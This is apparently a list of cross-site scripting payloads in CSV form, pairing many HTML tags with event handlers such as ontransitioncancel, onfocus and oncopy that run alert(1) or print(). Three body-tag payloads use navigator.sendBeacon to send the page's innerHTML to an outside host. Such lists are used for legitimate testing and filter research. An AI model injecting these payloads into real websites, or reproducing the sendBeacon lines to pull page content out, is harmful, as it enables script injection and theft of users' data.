Payload
<abbr onpointercancel=alert(1)>XSS</abbr>
"<bdi oncontextmenu=""alert(1)"" style=display:block>test</bdi>"
<body onbeforeprint=console.log(1)>
"<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>"
<body onmessage=print()>
"<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>"
<body onpopstate=print()>
"<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>"
<center id=x tabindex=1 onfocus=alert(1)></center>
<cite contenteditable onbeforeinput=alert(1)>test
"<cite oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test"
"<command onmouseout=""alert(1)"" style=display:block>test</command>"
<iframe autofocus onfocus=alert(1)>
"<optgroup onkeydown=""alert(1)"" contenteditable style=display:block>test</optgroup>"
"<style>:target {color: red;}</style><a id=x style=""transition:color 10s"" ontransitioncancel=print()></a>"
"<style>:target {color: red;}</style><a2 id=x style=""transition:color 10s"" ontransitioncancel=print()></a2>"
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=print()></abbr>"
"<style>:target {color: red;}</style><acronym id=x style=""transition:color 10s"" ontransitioncancel=print()></acronym>"
"<style>:target {color: red;}</style><address id=x style=""transition:color 10s"" ontransitioncancel=print()></address>"
"<style>:target {color: red;}</style><animate id=x style=""transition:color 10s"" ontransitioncancel=print()></animate>"
"<style>:target {color: red;}</style><animatemotion id=x style=""transition:color 10s"" ontransitioncancel=print()></animatemotion>"
"<style>:target {color: red;}</style><animatetransform id=x style=""transition:color 10s"" ontransitioncancel=print()></animatetransform>"
"<style>:target {color: red;}</style><applet id=x style=""transition:color 10s"" ontransitioncancel=print()></applet>"
"<style>:target {color: red;}</style><area id=x style=""transition:color 10s"" ontransitioncancel=print()></area>"
"<style>:target {color: red;}</style><article id=x style=""transition:color 10s"" ontransitioncancel=print()></article>"
"<style>:target {color: red;}</style><aside id=x style=""transition:color 10s"" ontransitioncancel=print()></aside>"
"<style>:target {color: red;}</style><audio id=x style=""transition:color 10s"" ontransitioncancel=print()></audio>"
"<style>:target {color: red;}</style><audio2 id=x style=""transition:color 10s"" ontransitioncancel=print()></audio2>"
"<style>:target {color: red;}</style><b id=x style=""transition:color 10s"" ontransitioncancel=print()></b>"
"<style>:target {color: red;}</style><bdi id=x style=""transition:color 10s"" ontransitioncancel=print()></bdi>"
"<style>:target {color: red;}</style><bdo id=x style=""transition:color 10s"" ontransitioncancel=print()></bdo>"
"<style>:target {color: red;}</style><big id=x style=""transition:color 10s"" ontransitioncancel=print()></big>"
"<style>:target {color: red;}</style><blink id=x style=""transition:color 10s"" ontransitioncancel=print()></blink>"
"<style>:target {color: red;}</style><blockquote id=x style=""transition:color 10s"" ontransitioncancel=print()></blockquote>"
"<style>:target {color: red;}</style><body id=x style=""transition:color 10s"" ontransitioncancel=print()></body>"
"<style>:target {color: red;}</style><br id=x style=""transition:color 10s"" ontransitioncancel=print()></br>"
"<style>:target {color: red;}</style><button id=x style=""transition:color 10s"" ontransitioncancel=print()></button>"
"<style>:target {color: red;}</style><canvas id=x style=""transition:color 10s"" ontransitioncancel=print()></canvas>"
"<style>:target {color: red;}</style><caption id=x style=""transition:color 10s"" ontransitioncancel=print()></caption>"
"<style>:target {color: red;}</style><center id=x style=""transition:color 10s"" ontransitioncancel=print()></center>"
"<style>:target {color: red;}</style><cite id=x style=""transition:color 10s"" ontransitioncancel=print()></cite>"
"<style>:target {color: red;}</style><code id=x style=""transition:color 10s"" ontransitioncancel=print()></code>"
"<style>:target {color: red;}</style><col id=x style=""transition:color 10s"" ontransitioncancel=print()></col>"
"<style>:target {color: red;}</style><colgroup id=x style=""transition:color 10s"" ontransitioncancel=print()></colgroup>"
"<style>:target {color: red;}</style><command id=x style=""transition:color 10s"" ontransitioncancel=print()></command>"
"<style>:target {color: red;}</style><content id=x style=""transition:color 10s"" ontransitioncancel=print()></content>"
"<style>:target {color: red;}</style><custom tags id=x style=""transition:color 10s"" ontransitioncancel=print()></custom tags>"
"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=print()></data>"
"<style>:target {color: red;}</style><datalist id=x style=""transition:color 10s"" ontransitioncancel=print()></datalist>"
"<style>:target {color: red;}</style><dd id=x style=""transition:color 10s"" ontransitioncancel=print()></dd>"
"<style>:target {color: red;}</style><del id=x style=""transition:color 10s"" ontransitioncancel=print()></del>"
"<style>:target {color: red;}</style><details id=x style=""transition:color 10s"" ontransitioncancel=print()></details>"
"<style>:target {color: red;}</style><dfn id=x style=""transition:color 10s"" ontransitioncancel=print()></dfn>"
"<style>:target {color: red;}</style><dialog id=x style=""transition:color 10s"" ontransitioncancel=print()></dialog>"
"<style>:target {color: red;}</style><dir id=x style=""transition:color 10s"" ontransitioncancel=print()></dir>"
"<style>:target {color: red;}</style><div id=x style=""transition:color 10s"" ontransitioncancel=print()></div>"
"<style>:target {color: red;}</style><dl id=x style=""transition:color 10s"" ontransitioncancel=print()></dl>"
"<style>:target {color: red;}</style><dt id=x style=""transition:color 10s"" ontransitioncancel=print()></dt>"
"<style>:target {color: red;}</style><element id=x style=""transition:color 10s"" ontransitioncancel=print()></element>"
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=print()></em>"
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=print()></embed>"
"<style>:target {color: red;}</style><fieldset id=x style=""transition:color 10s"" ontransitioncancel=print()></fieldset>"
"<style>:target {color: red;}</style><figcaption id=x style=""transition:color 10s"" ontransitioncancel=print()></figcaption>"
"<style>:target {color: red;}</style><figure id=x style=""transition:color 10s"" ontransitioncancel=print()></figure>"
"<style>:target {color: red;}</style><font id=x style=""transition:color 10s"" ontransitioncancel=print()></font>"
"<style>:target {color: red;}</style><footer id=x style=""transition:color 10s"" ontransitioncancel=print()></footer>"
"<style>:target {color: red;}</style><form id=x style=""transition:color 10s"" ontransitioncancel=print()></form>"
"<style>:target {color: red;}</style><frame id=x style=""transition:color 10s"" ontransitioncancel=print()></frame>"
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=print()></frameset>"
"<style>:target {color: red;}</style><h1 id=x style=""transition:color 10s"" ontransitioncancel=print()></h1>"
"<style>:target {color: red;}</style><head id=x style=""transition:color 10s"" ontransitioncancel=print()></head>"
"<style>:target {color: red;}</style><header id=x style=""transition:color 10s"" ontransitioncancel=print()></header>"
"<style>:target {color: red;}</style><hgroup id=x style=""transition:color 10s"" ontransitioncancel=print()></hgroup>"
"<style>:target {color: red;}</style><hr id=x style=""transition:color 10s"" ontransitioncancel=print()></hr>"
"<style>:target {color: red;}</style><html id=x style=""transition:color 10s"" ontransitioncancel=print()></html>"
"<style>:target {color: red;}</style><i id=x style=""transition:color 10s"" ontransitioncancel=print()></i>"
"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=print()></iframe>"
"<style>:target {color: red;}</style><iframe2 id=x style=""transition:color 10s"" ontransitioncancel=print()></iframe2>"
"<style>:target {color: red;}</style><image id=x style=""transition:color 10s"" ontransitioncancel=print()></image>"
"<style>:target {color: red;}</style><image2 id=x style=""transition:color 10s"" ontransitioncancel=print()></image2>"
"<style>:target {color: red;}</style><image3 id=x style=""transition:color 10s"" ontransitioncancel=print()></image3>"
"<style>:target {color: red;}</style><img id=x style=""transition:color 10s"" ontransitioncancel=print()></img>"
"<style>:target {color: red;}</style><img2 id=x style=""transition:color 10s"" ontransitioncancel=print()></img2>"
"<style>:target {color: red;}</style><input id=x style=""transition:color 10s"" ontransitioncancel=print()></input>"
"<style>:target {color: red;}</style><input2 id=x style=""transition:color 10s"" ontransitioncancel=print()></input2>"
"<style>:target {color: red;}</style><input3 id=x style=""transition:color 10s"" ontransitioncancel=print()></input3>"
"<style>:target {color: red;}</style><input4 id=x style=""transition:color 10s"" ontransitioncancel=print()></input4>"
"<style>:target {color: red;}</style><ins id=x style=""transition:color 10s"" ontransitioncancel=print()></ins>"
"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=print()></kbd>"
"<style>:target {color: red;}</style><keygen id=x style=""transition:color 10s"" ontransitioncancel=print()></keygen>"
"<style>:target {color: red;}</style><label id=x style=""transition:color 10s"" ontransitioncancel=print()></label>"
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=print()></legend>"
"<style>:target {color: red;}</style><li id=x style=""transition:color 10s"" ontransitioncancel=print()></li>"
"<style>:target {color: red;}</style><link id=x style=""transition:color 10s"" ontransitioncancel=print()></link>"
"<style>:target {color: red;}</style><listing id=x style=""transition:color 10s"" ontransitioncancel=print()></listing>"
